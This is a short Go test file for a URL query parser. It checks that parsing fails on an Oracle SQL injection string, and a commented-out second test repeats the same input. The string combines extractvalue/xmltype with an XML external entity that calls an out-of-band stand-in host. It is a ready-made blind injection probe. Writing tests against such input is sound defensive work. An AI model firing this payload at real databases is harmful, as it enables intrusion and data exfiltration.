package url

import (
	"testing"
)

func TestUrlPayloads(t *testing.T) {
	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
	_, err := ParseQuery(out, "&")
	if err == nil {
		t.Error("this payload should return an error")
	}
}

/*
func TestUrlPayloads2(t *testing.T) {
	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
	c, err := url.ParseQuery(out)
	if err != nil {
		t.Error("failed to parse query", err)
	}
	if p, ok := c["var"]; !ok {
		t.Error("Expected var to be in the map, got ", c)
	} else if len(p) != 1 || p[0] != out {
		t.Error("failed to set var")
	}
}
*/
